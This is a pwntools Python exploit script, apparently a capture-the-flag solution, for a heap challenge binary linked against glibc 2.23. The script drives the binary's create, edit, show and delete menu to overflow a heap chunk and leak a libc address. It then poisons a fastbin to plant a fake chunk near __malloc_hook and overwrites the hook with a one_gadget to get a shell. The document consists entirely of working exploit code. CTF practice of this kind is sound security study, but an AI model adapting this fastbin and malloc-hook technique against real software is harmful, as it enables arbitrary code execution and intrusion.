````python
from pwn import *

libc = ELF("./libc.2.23.so", checksec=False)

context.binary = exe = ELF("./pwn4_ul_patched", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		handle SIGALRM ignore
		br createHeap
		br *createHeap+144

		br deleteHeap
		br *deleteHeap+99

		br showHeap
		br showHeap+102

		br editHeap
		br *editHeap+266

		# heap check:
		# heap [-v]
		# vis
		# vmmap
		# x/4gx 0x006020e0
		''')

p = process(exe.path)
# GDB()

def createHeap(idx, size, data):
	p.sendlineafter(b">", b'1')
	p.sendlineafter(b"Index:", idx)
	p.sendlineafter(b"size:", size)
	p.sendlineafter(b"data:", data)

def showHeap(idx):
	p.sendlineafter(b">", b'2')
	p.sendlineafter(b"Index:", idx)	

def editHeap(idx, size, opt, data):
	p.sendlineafter(b">", b'3')
	p.sendlineafter(b"index:", idx)
	p.sendlineafter(b"newsize:", size)
	p.sendlineafter(b"?", opt)
	p.sendafter(b"data:", data)

def deleteHeap(idx):
	p.sendlineafter(b">", b'4')
	p.sendlineafter(b"index:", idx)	

# createHeap(b'0', b'1040', b'0' * 8)
createHeap(b'0', b'16', b'A' * 8)
createHeap(b'1', b'1040', b'B' * 8)
createHeap(b'2', b'16', b'C' * 8)
createHeap(b'3', b'96', b'D' * 8)
createHeap(b'4', b'16', b'E' * 8)

deleteHeap(b'1')
payload = b'A' * 24 + b'A'*8 
editHeap(b'0', b'64', b'y', payload)
showHeap(b'0')

leak_libc = p.recvuntil(b'\n')
leak_libc = leak_libc[-7:-1]
leak_libc = u64(leak_libc.ljust(8, b"\x00"))
print(f"leak_libc: {hex(leak_libc)}")

libc.address = leak_libc - 0x39bb78

print(f"libc_base: {hex(libc.address)}")

realloc = libc.sym['realloc']
fake_chunk = libc.sym['__malloc_hook'] - 0x23
one_gadget = libc.address + 0xd5bf7

GDB()
# delete chunk 3
deleteHeap(b'3')

print(f"fake_chunk: {hex(fake_chunk)}")
print(f"realloc: {hex(realloc)}")
print(f"one_gadget: {hex(one_gadget)}")
payload = b'A' * 24 + p64(0x71) + p64(fake_chunk)
editHeap(b'2', b'64', b'y', payload)

createHeap(b'5', b'96', b'F' * 8)

payload = b'A' * 11 + p64(one_gadget) + p64(realloc + 14)
createHeap(b'6', b'96', payload)

p.sendlineafter(b">", b'1')
p.sendlineafter(b"Index:", b'7')
# p.sendlineafter(b"size:", b'10')
# p.sendlineafter(b"data:", b'AAA')

p.interactive()

````
